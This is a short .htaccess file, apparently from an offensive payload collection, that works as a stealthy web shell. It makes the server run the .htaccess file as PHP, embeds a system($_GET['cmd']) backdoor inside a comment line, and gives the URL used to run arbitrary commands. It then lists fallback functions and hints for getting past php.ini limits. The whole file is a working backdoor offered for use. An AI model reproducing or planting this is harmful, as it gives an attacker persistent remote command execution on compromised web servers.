# htaccess backdoor shell
# this is relatively stealthy compared to a typical webshell

# overriding deny rule
# making htaccess accessible from the internet

# Make the server treat .htaccess file as .php file
AddType application/x-httpd-php .htaccess

# <?php system($_GET['cmd']); ?>

# To execute commands you would navigate to:
# http://vulnerable.com/.htaccess?cmd=YourCommand

# If system(); isnt working then try other syscalls
# e.g. passthru(); shell_exec(); etc
# If you still cant execute syscalls, try bypassing php.ini via htaccess
